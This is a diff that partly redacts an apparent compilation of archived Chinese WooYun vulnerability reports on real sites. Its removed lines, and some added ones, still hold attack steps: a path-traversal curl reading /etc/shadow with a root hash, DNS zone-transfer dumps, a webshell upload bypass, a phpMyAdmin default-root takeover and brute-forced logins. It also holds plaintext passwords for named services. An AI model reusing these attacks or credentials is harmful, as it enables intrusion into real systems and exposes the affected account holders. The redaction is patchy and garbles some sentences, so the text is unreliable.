-**POC**: 地址：http://www.century21.com.tw/index.aspx?fn=index2首页：泄露指向：; <<>> DiG 9.8.3-P1 <<>> @pdns1.pchome.com.tw. axfr century21.com.tw; (1 server found);; global options: +cmdcentury21.com.tw.	3600	IN	SOA	localhost\@. hostmaster.century21.com.tw. 2015 10800 3600 604800 3600century21.com.tw.	3600	IN	MX	1 as
+**POC**: 地址：https://example.com/[已脱敏] <<>> DiG 9.8.3-P1 <<>> @pdns1.pchome.com.tw. axfr century21.com.tw; (1 server found);; global options: +cmdcentury21.com.tw.	3600	IN	SOA	localhost\@. hostmaster.century21.com.tw. 2015 10800 3600 604800 3600century21.com.tw.	3600	IN	MX	1 as
 
 **绕过**: 直接利用
 
@@ -16486,7 +16486,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 由这里可以看出技术人员是做过限制的，但是对于这种1 v 1的方式是没用的。http://wap3.qiushibaike.com/loginhttp://nearby.qiushibaike.com/user/100/detail获取login字段的内容（用户名）写个工具遍历id跑啊跑~这里的中文unicode了。批量转换过来就行在测试过程中，请求过频繁。导致503了。ping也ping不通。app端也没刷新不出。（也就没继续了。）
+**详情**: 由这里可以看出技术人员是做过限制的，但是对于这种1 v 1的方式是没用的。https://example.com/[已脱敏]
 
 **POC**: ReSult：登陆：技术大哥上次那个1rank真的很让人不乐意...邮箱出来了只有1rank....唉。这次如果那
 
@@ -16508,7 +16508,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 酷我充值由于配置不当，存在心脏出血漏洞，影响业务资金安全http://123.150.175.184/http://123.150.175.180/
+**详情**: 酷我充值由于配置不当，存在心脏出血漏洞，影响业务资金安全http://[IP已脱敏]
 
 **POC**: <code>Connecting...Sending Client Hello...Waiting for Server Hello...... received message: type = 22, ver = 0302, length = 58... received message: type = 22, ver = 0302, length = 3927... received message: type = 22, ver = 0302, length = 525... received message: type = 22, ver = 0302, length = 4Sendi
 
@@ -16532,7 +16532,7 @@
 
 **详情**: 
 
-**POC**: http://www.ccgp-hunan.gov.cn/web.rarhttp://www.ccgp-hunan.gov.cn/admin/admin/sys_set.cfm
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -16552,7 +16552,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://up.sohu.com/~root
+**详情**: https://example.com/[已脱敏]
 
 **POC**: ForbiddenYou don't have permission to access /~root on this server.Additionally, a 403 Forbidden error was encountered while trying to use an ErrorDocument to handle the request.--------------------------------------------------------------------------------Apache/2.0.52 (Unix) mod_ssl/2.0.52 OpenSS
 
@@ -16596,9 +16596,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 地址：http://intra.ccfsoft.com:8088/code/projects直接上图建议对代码管理平台关闭匿名访问
+**详情**: 地址：https://example.com/[已脱敏]
 
-**POC**: 地址：http://intra.ccfsoft.com:8088/code/projects直接上图建议对代码管理平台关闭匿名访问
+**POC**: 地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -16618,7 +16618,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.nlc.gov.cn/dsb_zyyfw/wdtsg/wszxt/先进入此网址点击注册用户登录,然后去掉端口和后面所有地址,直接IP访问80端口,然后点击phpMyAdmin Database Manager Version 2.10.2.输入默认用户名密码root,就能访问,执行sql语句提权
+**详情**: https://example.com/[已脱敏] Database Manager Version 2.10.2.输入默认用户名密码root,就能访问,执行sql语句提权
 
 **POC**: 进入phpmyadmin后可以进行执行sql语句,然后开启服务器3389,创建一个超级管理员账户密码,最后被黑掉
 
@@ -16640,9 +16640,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 我又去了http://101.227.68.201:8099/Login.aspx结果是登录不进去然后又试了下发现了然后http://124.237.87.30/帐号是酒店编号 密码也
+**详情**: 我又去了http://[IP已脱敏] 密码也
 
-**POC**: 我又去了http://101.227.68.201:8099/Login.aspx结果是登录不进去然后又试了下发现了然后http://124.237.87.30/帐号是酒店编号 密码也
+**POC**: 我又去了http://[IP已脱敏] 密码也
 
 **绕过**: 直接利用
 
@@ -16662,7 +16662,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://qfoa.qfkd.com.cn/setqfkd/login.aspx没有验证码  可以用burp暴力破解随机测试一个号段  密码1234565126个账号   爆破成功111个   导出02816387600979500451024093400702007702001202001102000702004002004502004302005002006402007102007702008102009002011802012002014002019102019002020102020202026202026502028002030002031202033002043202043102051402051302054002055002056002056102055902057002058002059002062002071002074002075102075402076102077
+**详情**: https://example.com/[已脱敏]  可以用burp暴力破解随机测试一个号段  密码1234565126个账号   爆破成功111个   导出02816387600979500451024093400702007702001202001102000702004002004502004302005002006402007102007702008102009002011802012002014002019102019002020102020202026202026502028002030002031202033002043202043102051402051302054002055002056002056102055902057002058002059002062002071002074002075102075402076102077
 
 **POC**: 如上已证明
 
@@ -16684,18 +16684,18 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 61.147.105.223 Mongodb 配置不当
+**详情**: [IP已脱敏] Mongodb 配置不当
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 参考 http://drops.wooyun.org/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/2470
+**修复**: 参考 https://example.com/[已脱敏]
 ---
 
 ---
 ### [wooyun-2014-049714] ASPCMS投票系统数据库防下载绕过漏洞
-**厂商**: http://www.aspcms.com/ | **年份**: 2014 | **类型**: 默认配置不当
+**厂商**: https://example.com/[已脱敏] | **年份**: 2014 | **类型**: 默认配置不当
 
 **元思考**: 触发信号: 后台管理
 
@@ -16750,7 +16750,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: nmap -n --open -p 873 www.dufe.edu.cn/24Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-09-13 17:18 CSTNmap scan report for 202.199.160.186Host is up (0.0020s latency).PORT    STATE SERVICE873/tcp open  rsyncNmap scan report for 202.199.160.209Host is up (0.0022s latency).PORT    STATE SERVICE873/tcp open  rsyncNmap done: 256 IP addresses (67 hosts up) scanned in 4.29 secondsroot@kali:~# rsyn
+**详情**: nmap -n --open -p 873 www.dufe.edu.cn/24Starting Nmap 6.49BETA4 ( https://example.com/[已脱敏] ) at 2015-09-13 17:18 CSTNmap scan report for [IP已脱敏]Host is up (0.0020s latency).PORT    STATE SERVICE873/tcp open  rsyncNmap scan report for [IP已脱敏]Host is up (0.0022s latency).PORT    STATE SERVICE873/tcp open  rsyncNmap done: 256 IP addresses (67 hosts up) scanned in 4.29 secondsroot@kali:~# rsyn
 
 **POC**: 如上
 
@@ -16816,7 +16816,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://mobile.tudou.com/#免费发送到手机时GET /crp/check.action?msg=任意内容&m=手机&codeId=1382584778-a01.validnum.sh.jj.tudou.com-55893&code=8ey4&jsoncallback=sendBack HTTP/1.1
+**详情**: https://example.com/[已脱敏] /crp/check.action?msg=任意内容&m=手机&codeId=1382584778-a01.validnum.sh.jj.tudou.com-55893&code=8ey4&jsoncallback=sendBack HTTP/1.1
 
 **POC**: 看看效果
 
@@ -16838,7 +16838,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 直接匿名访问ftp://113.107.172.62/即可
+**详情**: 直接匿名访问ftp://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -16862,7 +16862,7 @@
 
 **详情**: 官网后台登入框有注入，所以直接搞定，不过找到后台是从SVN服务器里挖出来的，毕竟后台地址非同寻常，而SVN的帐号密码是因为当初你们网站下面有SVN同步时产生的目录文件，通过访问这些文件获得当时操作SVN的管理员帐户名，猜测密码发现与用户名一致，所以进入了SVN，反正有些分站的漏洞神马的你们早先也修复了，因为当初应该被你们运维发现了才对，当初动作有点大了，还搞了PAM记了点密码估计都被清除了。
 
-**POC**: http://www.ubox.cn/公网IP [211.151.164.43] 内网IP[172.16.10.43]网站路径：/home/wwwroot/www.ubox.cn/网站后台：http://www.ubox.cn/freedom/index.php/index/login.html账号admin 密码：wangxian1001帐号test  密码：nihao123             *这个帐号我自己加的 你们自行删除就好了Mysql数据库：主机：172.16.10.37或172.16.10.40	反正主机名是mysql01帐号：writeable库名：ubox-------
+**POC**: https://example.com/[已脱敏] [[IP已脱敏]] 内网IP[[IP已脱敏]]网站路径：/home/wwwroot/www.ubox.cn/网站后台：https://example.com/[已脱敏] 密码：wangxian1001帐号test  密码：nihao123             *这个帐号我自己加的 你们自行删除就好了Mysql数据库：主机：[IP已脱敏]或172.16.10.40	反正主机名是mysql01帐号：writeable库名：ubox-------
 
 **绕过**: 直接利用
 
@@ -16882,7 +16882,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://211.154.163.90/得到文件1.txt的内容得到账号13631583095密码：xiang123456登录用户后台内容
+**详情**: https://[IP已脱敏]
 
 **POC**: 漏洞证明看详细说明，严重程度不止这个，还可以获取很多数据，只是小小测试
 
@@ -16904,13 +16904,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 下载app（http://121.199.10.229/Yooli_1.0.8.apk ）的时候发现端口11211是开着的。
+**详情**: 下载app（http://[IP已脱敏] ）的时候发现端口11211是开着的。
 
-**POC**: 还有一些测漏http://121.199.10.229/info.phphttp://121.199.10.229/index.php/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000http://121.199.10.229//.svn/format
+**POC**: 还有一些测漏http://[IP已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: http://drops.wooyun.org/papers/865
+**修复**: https://example.com/[已脱敏]
 ---
 
 ---
@@ -16928,7 +16928,7 @@
 
 **详情**: 此处忽略100字
 
-**POC**: http://www.cert.org.cn/cert/flash/jsp/.svn/entries
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -16948,7 +16948,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: > server ns2.qyer.comDefault Server:  ns2.qyer.comAddress:  115.182.69.196> ls qyer.com[ns2.qyer.com]qyer.com.                      A      115.182.69.203qyer.com.                      NS     server = ns1.qyer.comqyer.com.                      NS     server = ns2.qyer.com*                              A      115.182.69.203115.182.69.196                 A      115.182.69.196115.182.69.216           
+**详情**: > server ns2.qyer.comDefault Server:  ns2.qyer.comAddress:  [IP已脱敏]> ls qyer.com[ns2.qyer.com]qyer.com.                      A      [IP已脱敏]qyer.com.                      NS     server = ns1.qyer.comqyer.com.                      NS     server = ns2.qyer.com*                              A      [IP已脱敏]115.182.69.196                 A      [IP已脱敏]115.182.69.216           
 
 **POC**: (见原文)
 
@@ -16970,9 +16970,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.url：http://www.8891.com.tw/2.首页：3.泄露信息：; <<>> DiG 9.8.3-P1 <<>> @ns3.addcn.com. axfr 1796.com.tw; (1 server found);; global options: +cmd1796.com.tw.		90	IN	SOA	ns2.addcn.com. ronman.8591.com.tw. 2012082003 10800 3600 604800 864001796.com.tw.		90	IN	MX	1 ASPMX.L.GOOGLE.com.1796.com.tw.		90	IN	MX	5 ALT1.ASPMX.L.GOOGLE.com.1796.com.tw.		90	IN	MX	10 ASPMX2.GOOGLEMAIL.com.1796.com.tw.		90	IN	MX	15 m
+**详情**: 1.url：https://example.com/[已脱敏] <<>> DiG 9.8.3-P1 <<>> @ns3.addcn.com. axfr 1796.com.tw; (1 server found);; global options: +cmd1796.com.tw.		90	IN	SOA	ns2.addcn.com. ronman.8591.com.tw. 2012082003 10800 3600 604800 864001796.com.tw.		90	IN	MX	1 ASPMX.L.GOOGLE.com.1796.com.tw.		90	IN	MX	5 ALT1.ASPMX.L.GOOGLE.com.1796.com.tw.		90	IN	MX	10 ASPMX2.GOOGLEMAIL.com.1796.com.tw.		90	IN	MX	15 m
 
-**POC**: 1.url：http://www.8891.com.tw/2.首页：3.泄露信息：; <<>> DiG 9.8.3-P1 <<>> @ns3.addcn.com. axfr 1796.com.tw; (1 server found);; global options: +cmd1796.com.tw.		90	IN	SOA	ns2.addcn.com. ronman.8591.com.tw. 2012082003 10800 3600 604800 864001796.com.tw.		90	IN	MX	1 ASPMX.L.GOOGLE.com.1796.com.tw.		90	IN	MX	5
+**POC**: 1.url：https://example.com/[已脱敏] <<>> DiG 9.8.3-P1 <<>> @ns3.addcn.com. axfr 1796.com.tw; (1 server found);; global options: +cmd1796.com.tw.		90	IN	SOA	ns2.addcn.com. ronman.8591.com.tw. 2012082003 10800 3600 604800 864001796.com.tw.		90	IN	MX	1 ASPMX.L.GOOGLE.com.1796.com.tw.		90	IN	MX	5
 
 **绕过**: 直接利用
 
@@ -16994,7 +16994,7 @@
 
 **详情**: 中国人民大学信息学院存在写权漏洞
 
-**POC**: http://info.ruc.edu.cn/http://info.ruc.edu.cn/wooyu.txt
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -17036,7 +17036,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞地址：http://www.dragontrans.com/
+**详情**: 漏洞地址：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -17058,9 +17058,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 存在DNS域传送：55tuan.com => 111.20.240.154
+**详情**: 存在DNS域传送：55tuan.com => [IP已脱敏]
 
-**POC**: C:\Users\Administrator>nslookup默认服务器:  UnKnownAddress:  211.137.130.3> set type=ns> 55tuan.com服务器:  UnKnownAddress:  211.137.130.3DNS request timed out.timeout was 2 seconds.非权威应答:55tuan.com      nameserver = ns2.dnsv5.com55tuan.com      nameserver = ns1.dnsv5.comns2.dnsv5.com   internet address = 1
+**POC**: C:\Users\Administrator>nslookup默认服务器:  UnKnownAddress:  [IP已脱敏]> set type=ns> 55tuan.com服务器:  UnKnownAddress:  [IP已脱敏]DNS request timed out.timeout was 2 seconds.非权威应答:55tuan.com      nameserver = ns2.dnsv5.com55tuan.com      nameserver = ns1.dnsv5.comns2.dnsv5.com   internet address = 1
 
 **绕过**: 直接利用
 
@@ -17124,7 +17124,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 站：www.hkcts.com/www.hkcts.com/CMS/job/resume.action?post.id=99‎   点  报名用的直接写   把JSP马后缀名改为 .jpg   上传抓包：将图中.jpg  直接改为 .jsp上传： ok  绕过成功上传用户修改添加都 ok  服务器秒下。ok  管理员  我们QQ聊  呵。。
+**详情**: 站：www.hkcts.com/www.hkcts.com/CMS/job/resume.action?post.id=99‎   点  报名用的直接写   把JSP马后缀名改为 .jpg   上传抓包：将图中.jpg  直接改为 .jsp上传： ok  绕过成功上传用户修改添加都 ok  服务器秒下。ok  管理员  我们某互联网公司聊  呵。。
 
 **POC**: 如上
 
@@ -17190,7 +17190,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://223.252.192.37/兴业证券企业邮箱配置不当，rsync 泄露223.252.192.37::coremail223.252.192.37::ms-data00223.252.192.37::ms-data01223.252.192.37::ud-data223.252.192.37::mysql-data数据完爆
+**详情**: http://[IP已脱敏] 泄露223.252.192.37::coremail223.252.192.37::ms-data00223.252.192.37::ms-data01223.252.192.37::ud-data223.252.192.37::mysql-data数据完爆
 
 **POC**: (见原文)
 
@@ -17200,8 +17200,8 @@
 ---
 
 ---
-### [wooyun-2012-04690] 中国移动分站设置不当，列目录
-**厂商**: 中国移动 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-04690] 某运营商分站设置不当，列目录
+**厂商**: 某运营商 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -17212,7 +17212,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞分站：http://game.10086.cn出现漏洞地址：http://game.10086.cn/spbbs/images/http://game.10086.cn/spbbs/admin/等等
+**详情**: 漏洞分站：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -17236,7 +17236,7 @@
 
 **详情**: 无奈了。。。我觉得看样子还有好多没仔细扫。。直接就先这把。。。（大部分没测试。光是扫粗来的）
 
-**POC**: 仪器预约系统 注入http://202.207.240.51/equinfor.jsp?empid=29http://202.207.240.51/artdetail.jsp?artid=6http://202.207.240.51/equipments.jsp?stnum=20140001太原理工大学矿业工程学院    存在fckeditor编辑器 可getshellhttp://202.207.240.27/include/fckeditor/太原理工大学教务处    存在fckeditor编辑器http://202.207.240.57/fckeditor/太原理工大学班车预约管理平台 
+**POC**: 仪器预约系统 注入http://[IP已脱敏]    存在fckeditor编辑器 可getshellhttp://[IP已脱敏]    存在fckeditor编辑器http://[IP已脱敏] 
 
 **绕过**: 直接利用
 
@@ -17258,7 +17258,7 @@
 
 **详情**: scu.edu.cn存在域传送大量的子域名外泄
 
-**POC**: scu.edu.cn.                              3600     IN    SOA      dart.scu.edu.cn.scu.edu.cn.                              3600     IN    A        125.69.85.18scu.edu.cn.                              3600     IN    A        125.69.85.19scu.edu.cn.                              3600     IN    MX       
+**POC**: scu.edu.cn.                              3600     IN    SOA      dart.scu.edu.cn.scu.edu.cn.                              3600     IN    A        [IP已脱敏]scu.edu.cn.                              3600     IN    A        [IP已脱敏]scu.edu.cn.                              3600     IN    MX       
 
 **绕过**: 直接利用
 
@@ -17278,7 +17278,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在app store随意搜索发现有南威mss应用随之下载使用下打开发现比软件是集团工作人员使用的去百度了下找来了集团员工的名字使用名字的拼音缩写成功登陆lajing123
+**详情**: 在app store随意搜索发现有南威mss应用随之下载使用下打开发现比软件是集团工作人员使用的去某搜索引擎了下找来了集团员工的名字使用名字的拼音缩写成功登陆lajing123
 
 **POC**: (见原文)
 
@@ -17300,9 +17300,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://mail.10035.com.cn/AppClientUpgrade/download.doTarget: http://mail.10035.com.cn/AppClientUpgrade/download.doWhoami: richmailWebPath: /home/richmail/web/AppClient/tomcat7/webapps/AppClientUpgrade/
+**详情**: https://example.com/[已脱敏] https://example.com/[已脱敏] richmailWebPath: /home/richmail/web/AppClient/tomcat7/webapps/AppClientUpgrade/
 
-**POC**: http://mail.10035.com.cn/AppClientUpgrade/download.doTarget: http://mail.10035.com.cn/AppClientUpgrade/download.doWhoami: richmailWebPath: /home/richmail/web/AppClient/tomcat7/webapps/AppClientUpgrade/
+**POC**: https://example.com/[已脱敏] https://example.com/[已脱敏] richmailWebPath: /home/richmail/web/AppClient/tomcat7/webapps/AppClientUpgrade/
 
 **绕过**: 直接利用
 
@@ -17322,13 +17322,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 就在刚才持续关注-12306事件。于是，我在百度直接搜索乌云最新消息出现如下画面。打开链接一看，我当时惊呆了。有人借助乌云名义刷QQ币，还声称自己是老鹰？是老鹰？骗子也太能见风使舵了吧。视频地址：http://www.yn.xinhuanet.com/v/2014-12/26/c_133880414.htm或自己百度乌云最新-选择那个新华网云南那个链接！
+**详情**: 就在刚才持续关注-12306事件。于是，我在某搜索引擎直接搜索乌云最新消息出现如下画面。打开链接一看，我当时惊呆了。有人借助乌云名义刷某互联网公司币，还声称自己是老鹰？是老鹰？骗子也太能见风使舵了吧。视频地址：https://example.com/[已脱敏]
 
-**POC**: 话说、借乌云网刷QQ币视频怎么能上传新华网呢？
+**POC**: 话说、借乌云网刷某互联网公司币视频怎么能上传新华网呢？
 
 **绕过**: 直接利用
 
-**修复**: 话说、借乌云网刷QQ币视频怎么能上传新华网呢？
+**修复**: 话说、借乌云网刷某互联网公司币视频怎么能上传新华网呢？
 ---
 
 ---
@@ -17344,7 +17344,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://oa.it.mobogarden.com/jira/browse/MWT-435?jql=没有关闭注册，注册了个测试账号test123/111111
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -17412,7 +17412,7 @@
 
 **详情**: 博恩教育网某处上千用户账号密码泄露www.bornedu.com/bornmanage/index.php?s=/Zhibo/index/tag/1
 
-**POC**: http://www.bornedu.com/bornmanage/index.php?s=/Zhibo/index/tag/1
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -17432,13 +17432,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 58.64.180.78 MongoDB 配置不当 造成信息泄漏
+**详情**: [IP已脱敏] MongoDB 配置不当 造成信息泄漏
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 启用 auth 指定 IP访问请参照 http://www.oschina.net/translate/10-tips-improve-mongodb
+**修复**: 启用 auth 指定 IP访问请参照 https://example.com/[已脱敏]
 ---
 
 ---
@@ -17476,9 +17476,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: [root@localhost tmp]# curl 113.107.237.90:8080/../../../../../../../../../../etc/shadowroot:$6$QAicn/l.6Wiv$B00A5EAdSrrCN1xw7dFROi5At7dpZXNfB4ZmVYfr/BNEQg.mDVqlAvlaGDIb0BxvlMlpb4Xx1cxLlzfu6S34j/:16450:0:99999:7:::daemon:*:15492:0:99999:7:::bin:*:15492:0:99999:7:::sys:*:15492:0:99999:7:::sync:*:15492:0:99999:7:::games:*:15492:0:99999:7:::man:*:15492:0:99999:7:::lp:*:15492:0:99999:7:::mail:*:15492:0
+**详情**: [root@localhost tmp]# curl [IP已脱敏]
 
-**POC**: [root@localhost tmp]# curl 113.107.237.90:8080/../../../../../../../../../../etc/shadowroot:$6$QAicn/l.6Wiv$B00A5EAdSrrCN1xw7dFROi5At7dpZXNfB4ZmVYfr/BNEQg.mDVqlAvlaGDIb0BxvlMlpb4Xx1cxLlzfu6S34j/:16450:0:99999:7:::daemon:*:15492:0:99999:7:::bin:*:15492:0:99999:7:::sys:*:15492:0:99999:7:::sync:*:15492
+**POC**: [root@localhost tmp]# curl [IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -17500,7 +17500,7 @@
 
 **详情**: 1.中嘉│bb寬頻上網、bbTV數位電視、有線電視及光纖級網路的數位生活家2.URL：www.cns.net.tw
 
-**POC**: 3.泄露信息：; <<>> DiG 9.8.3-P1 <<>> @dns2.totalbb.net.tw. axfr cns.net.tw; (1 server found);; global options: +cmdcns.net.tw.		600	IN	SOA	lakers. hostmaster. 248 3600 900 86400 1200dns1.totaltv.com.tw.	1200	IN	A	115.43.97.11cns.net.tw.		1200	IN	NS	nns.cns.net.tw.cns.net.tw.		1200	IN	NS	dns1.totalbb.net.
+**POC**: 3.泄露信息：; <<>> DiG 9.8.3-P1 <<>> @dns2.totalbb.net.tw. axfr cns.net.tw; (1 server found);; global options: +cmdcns.net.tw.		600	IN	SOA	lakers. hostmaster. 248 3600 900 86400 1200dns1.totaltv.com.tw.	1200	IN	A	[IP已脱敏]cns.net.tw.		1200	IN	NS	nns.cns.net.tw.cns.net.tw.		1200	IN	NS	dns1.totalbb.net.
 
 **绕过**: 直接利用
 
@@ -17530,8 +17530,8 @@
 ---
 
 ---
-### [wooyun-2015-0128985] 新浪某站配置不当
-**厂商**: 新浪 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
+### [wooyun-2015-0128985] 某社交平台某站配置不当
+**厂商**: 某社交平台 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 参数注入
 
@@ -17542,7 +17542,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: eat.gd.sina.com.cn/include.tar.gz<?php/*** 新浪广东美食频道通用餐厅库类.** LICENSE** @category   eat.gd.sina.com.cn* @package    Eat_Core_Library* @copyright  Copyright (c) 2009 ,  LiXiang* @license    New BSD License* @version    $Id: Data.php 2009-06-16  $*///require_once $_SERVER['DOCUMENT_ROOT']."/include/library/Common/Mysql.php";require_once realpath(dirname(__FILE__))."/../Common/Mysql.php";class Rstrt_D
+**详情**: eat.gd.sina.com.cn/include.tar.gz<?php/*** 某社交平台广东美食频道通用餐厅库类.** LICENSE** @category   eat.gd.sina.com.cn* @package    Eat_Core_Library* @copyright  Copyright (c) 2009 ,  LiXiang* @license    New BSD License* @version    $Id: Data.php 2009-06-16  $*///require_once $_SERVER['DOCUMENT_ROOT']."/include/library/Common/Mysql.php";require_once realpath(dirname(__FILE__))."/../Common/Mysql.php";class Rstrt_D
 
 **POC**: (见原文)
 
@@ -17588,7 +17588,7 @@
 
 **详情**: 解析。不解释
 
-**POC**: http://wan.360.cn/robots.txt/1.phpnginx 解析漏洞
+**POC**: https://example.com/[已脱敏] 解析漏洞
 
 **绕过**: 直接利用
 
@@ -17610,7 +17610,7 @@
 
 **详情**: 直接上图吧。可能包含重要内容。
 
-**POC**: 直接访问网址即可http://careers.hisoft.com/
+**POC**: 直接访问网址即可https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -17630,7 +17630,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 出问题站点1.api.gfan.com配置不当http://api.gfan.com/resin-doc/examples/ioc-periodictask/viewfile?file=index.xtp2.nb.gfan.com可用ecshop进行注入 权限为root
+**详情**: 出问题站点1.api.gfan.com配置不当https://example.com/[已脱敏] 权限为root
 
 **POC**: ResinEcshop
 
@@ -17641,7 +17641,7 @@
 
 ---
 ### [wooyun-2015-0104892] 移动某分站备份数据库可被下载
-**厂商**: 中国移动 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -17652,7 +17652,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1：缺陷URLhttp://net.chinamobile.com/bbs/http://net.chinamobile.com/bbs/data/backup~2/130726~1.sql2：该站点采用了discuz，但是悲剧的是貌似使用了windows的系统3：windows系统有个特性，在文件名较长的时候，会自动给整个短文件名4：DISCUZ备份数据库的时候，名字很长，而且很有特点，目录在data/backup~x/xxxxxx~X.sql5:此时我们首先去判断是否有backup~x目录，然后再去判断是否有sql文件6：经过测试发现有backup~1和backup~2目录7：然后去暴力请求备份文件，只需要用python生成一个日期字典即可有xxxx1.sql的一般都有xxx2.sql的哦8：看下内容这个用16进制转换了，账号是admin，就不深入了
+**详情**: 1：缺陷URLhttps://example.com/[已脱敏]
 
 **POC**: 7：然后去暴力请求备份文件，只需要用python生成一个日期字典即可有xxxx1.sql的一般都有xxx2.sql的哦8：看下内容这个用16进制转换了，账号是admin，就不深入了
 
@@ -17696,7 +17696,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://eyun.pet.mop.com/WEB-INF/web.xmlhttp://s39.sg.mop.com/WEB-INF/web.xmlhttp://s69.pet.mop.com/WEB-INF/web.xmlhttp://test.pet.mop.com/WEB-INF/web.xml
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -17718,9 +17718,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.url：http://www.ek21.com2.泄露信息：; <<>> DiG 9.8.3-P1 <<>> @ns2.ek21.com.tw. axfr ek21.com; (1 server found);; global options: +cmdek21.com.		3600	IN	SOA	ns1.ek21.com.tw. dar.ek21.com. 2014121801 3600 600 604800 3600ek21.com.		3600	IN	NS	ns1.ek21.com.tw.ek21.com.		3600	IN	NS	ns2.ek21.com.tw.ek21.com.		3600	IN	A	210.59.146.142ek21.com.		3600	IN	MX	10 ASPMX.L.GOOGLE.com.ek21.com.		3600	IN	MX	20 ALT1.A
+**详情**: 1.url：https://example.com/[已脱敏] <<>> DiG 9.8.3-P1 <<>> @ns2.ek21.com.tw. axfr ek21.com; (1 server found);; global options: +cmdek21.com.		3600	IN	SOA	ns1.ek21.com.tw. dar.ek21.com. 2014121801 3600 600 604800 3600ek21.com.		3600	IN	NS	ns1.ek21.com.tw.ek21.com.		3600	IN	NS	ns2.ek21.com.tw.ek21.com.		3600	IN	A	[IP已脱敏]ek21.com.		3600	IN	MX	10 ASPMX.L.GOOGLE.com.ek21.com.		3600	IN	MX	20 ALT1.A
 
-**POC**: 1.url：http://www.ek21.com2.泄露信息：; <<>> DiG 9.8.3-P1 <<>> @ns2.ek21.com.tw. axfr ek21.com; (1 server found);; global options: +cmdek21.com.		3600	IN	SOA	ns1.ek21.com.tw. dar.ek21.com. 2014121801 3600 600 604800 3600ek21.com.		3600	IN	NS	ns1.ek21.com.tw.ek21.com.		3600	IN	NS	ns2.ek21.com.tw.ek21.com.	
+**POC**: 1.url：https://example.com/[已脱敏] <<>> DiG 9.8.3-P1 <<>> @ns2.ek21.com.tw. axfr ek21.com; (1 server found);; global options: +cmdek21.com.		3600	IN	SOA	ns1.ek21.com.tw. dar.ek21.com. 2014121801 3600 600 604800 3600ek21.com.		3600	IN	NS	ns1.ek21.com.tw.ek21.com.		3600	IN	NS	ns2.ek21.com.tw.ek21.com.	
 
 **绕过**: 直接利用
 
@@ -17762,9 +17762,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 被收录3个有2个重复实际为2个分别是http://www.ku6.com/?account=cuixuesong&expire=on&password=wangqiao521@&x=47&y=18http://www.ku6.com/?account=z439912678@163.com&expire=on&password=Zhao521%2B.%3F&x=0&y=0cuixuesong&expire=on&password=wangqiao521@测试不可用但是z439912678@163.com&expire=on&password=Zhao521%2B.确认可以登录账号:z439912678@163.com密码:Zhao521+.?
+**详情**: 被收录3个有2个重复实际为2个分别是https://example.com/[已脱敏]
 
